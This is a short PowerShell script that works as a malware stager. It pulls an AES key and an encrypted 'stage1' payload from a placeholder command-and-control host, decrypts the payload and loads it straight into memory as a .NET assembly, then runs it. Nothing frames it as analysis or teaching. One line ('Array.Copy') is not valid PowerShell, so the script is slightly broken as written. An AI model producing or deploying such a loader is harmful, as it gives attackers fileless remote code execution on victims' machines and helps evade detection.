$ErrorActionPreference = 'Stop'
$keyResp = Invoke-RestMethod -Uri 'http://<C2_HOST>:8080/key'
$key = [Convert]::FromBase64String($keyResp.key)
$iv = [Convert]::FromBase64String($keyResp.iv)
$enc = Invoke-RestMethod -Uri 'http://<C2_HOST>:8080/stage1'
$raw = [Convert]::FromBase64String($enc)
$ct = New-Object byte[] ($raw.Length - 16)
Array.Copy($raw, 16, $ct, 0, $ct.Length)
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV = $iv
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$dec = $aes.CreateDecryptor()
$plain = $dec.TransformFinalBlock($ct, 0, $ct.Length)
$assembly = [System.Reflection.Assembly]::Load($plain)
[Stage1.Main]::Run()